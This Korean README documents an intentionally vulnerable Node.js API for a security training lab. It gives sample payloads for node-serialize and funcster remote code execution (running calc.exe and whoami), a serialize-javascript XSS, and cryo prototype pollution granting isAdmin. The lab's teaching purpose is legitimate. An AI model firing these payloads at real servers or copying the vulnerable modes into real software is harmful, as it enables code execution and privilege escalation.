# WebSec-Lab Node.js Deserialization API

🚨 **WARNING: This API contains intentional vulnerabilities for educational purposes only!**

## 개요

이 Node.js API 서버는 WebSec-Lab의 고급 직렬화 취약점 테스트를 위해 설계되었습니다. 실제 Node.js 직렬화 라이브러리들의 취약점을 안전한 환경에서 테스트할 수 있습니다.

## 설치 및 실행

### 1. 의존성 설치
```bash
cd /home/wsl/S_WEB_Project/websec-lab/src/node_api
npm install
```

### 2. 서버 실행
```bash
npm start
```

서버는 http://localhost:3001 에서 실행됩니다.

### 3. 개발 모드 (파일 변경 시 자동 재시작)
```bash
npm run dev
```

## API 엔드포인트

### 🏠 메인 정보
- `GET /` - API 정보 및 사용 가능한 엔드포인트 목록

### 🔥 취약점 테스트 엔드포인트

#### 1. node-serialize 취약점
- `POST /api/node-serialize`
- **페이로드 예제:**
```json
{
  "payload": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('calc.exe');}()\"}",
  "mode": "vulnerable"
}
```

#### 2. serialize-javascript XSS
- `POST /api/serialize-javascript`
- **페이로드 예제:**
```json
{
  "data": {
    "name": "</script><script>alert('XSS')</script>",
    "content": "malicious data"
  },
  "mode": "vulnerable"
}
```

#### 3. funcster RCE
- `POST /api/funcster`
- **페이로드 예제:**
```json
{
  "serializedFunction": "function() { require('child_process').exec('whoami'); }",
  "mode": "vulnerable"
}
```

#### 4. cryo 프로토타입 오염
- `POST /api/cryo`
- **페이로드 예제:**
```json
{
  "frozenData": "{\"__proto__\":{\"polluted\":\"yes\",\"isAdmin\":true},\"data\":\"hello\"}",
  "mode": "vulnerable"
}
```

### 🛠️ 유틸리티 엔드포인트

#### 페이로드 예제 생성
- `GET /api/generate-payload` - 각 취약점별 페이로드 예제 제공

#### 헬스 체크
- `GET /api/health` - 서버 상태 및 활성화된 취약점 확인

## 보안 모드

각 엔드포인트는 `mode` 파라미터로 안전한 구현과 취약한 구현을 비교할 수 있습니다:

- `"mode": "vulnerable"` - 취약한 구현 (교육 목적)
- `"mode": "safe"` - 안전한 구현 (권장 방법)

## 사용 예제

### cURL로 테스트
```bash
# node-serialize 취약점 테스트
curl -X POST http://localhost:3001/api/node-serialize \
  -H "Content-Type: application/json" \
  -d '{
    "payload": "{\"test\":\"_$$ND_FUNC$$_function(){console.log(\"RCE Test\");}()\"}",
    "mode": "vulnerable"
  }'
```

### PHP에서 호출 (WebSec-Lab 통합)
```php
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'http://localhost:3001/api/node-serialize',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode([
        'payload' => '{"rce":"_$$ND_FUNC$$_function(){console.log(\"Test\");}()"}',
        'mode' => 'vulnerable'
    ]),
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_RETURNTRANSFER => true
]);
$response = curl_exec($ch);
curl_close($ch);
```

## 로그 모니터링

서버 실행 중 다음과 같은 로그를 확인할 수 있습니다:

```
🚨 WARNING: This server contains intentional vulnerabilities for educational purposes!
🟢 WebSec-Lab Node.js API Server running on port 3001
[2024-01-01T12:00:00.000Z] POST /api/node-serialize
🔥 node-serialize vulnerability test started
⚠️ WARNING: About to execute potentially malicious payload
```

## 주의사항

⚠️ **중요:** 이 서버는 **교육 목적으로만** 사용해야 합니다.

- 🚫 **프로덕션 환경에서 사용 금지**
- 🚫 **공개 네트워크에 노출 금지**
- ✅ **격리된 테스트 환경에서만 사용**
- ✅ **학습 및 연구 목적으로만 사용**

## 트러블슈팅

### 포트 충돌
```bash
# 포트 3001이 사용 중인 경우
PORT=3002 npm start
```

### 의존성 설치 문제
```bash
# 캐시 클리어 후 재설치
npm cache clean --force
rm -rf node_modules package-lock.json
npm install
```

### PHP에서 API 연결 실패
1. Node.js 서버가 실행 중인지 확인
2. 방화벽 설정 확인
3. localhost 대신 127.0.0.1 사용 시도

## 라이선스

이 코드는 교육 목적으로만 제공되며, MIT 라이선스 하에 배포됩니다.